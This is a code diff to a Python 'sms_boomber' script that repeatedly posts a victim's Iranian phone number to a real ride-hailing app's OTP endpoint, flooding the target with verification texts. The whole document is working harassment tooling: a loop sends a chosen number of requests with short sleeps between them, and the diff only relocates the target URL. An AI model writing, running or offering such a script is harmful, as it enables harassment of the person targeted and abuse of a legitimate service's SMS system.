@@ -7,7 +7,6 @@ from colorama import Fore as c
 
 # cont varable
 class setting:
-    URL = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
     INPUT_STRUCT = c.RED + " [" + c.WHITE + "~" + c.RED + "]"
     STRUCT = c.RED + " [" + c.WHITE + "!" + c.RED + "]"
 
@@ -20,20 +19,22 @@ def sms_boomber(phonenumber, sms_number):
         else:
             try:
             # Send sms via post http method
+                URL = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
                 data = {
                     "cellphone": "+98" + phonenumber
                 }
 
                 for i in range(int(sms_number)):
-                    post(setting.URL, data)
+                    post(URL, data)
                     os.system("clear" or "cls")
                     print(setting.STRUCT + c.WHITE + " Send " + c.RED + str(i) + c.WHITE + " sms successfuly!")
-                            
+                    
                     time.sleep(3)
 
             except Exception as err:
                 print(setting.STRUCT + " Error whene sending sms!")
                 exit()
+
     except Exception as err:
         print(err)
         print(setting.STRUCT + c.RED + "Somethink went wring! Please try again.")
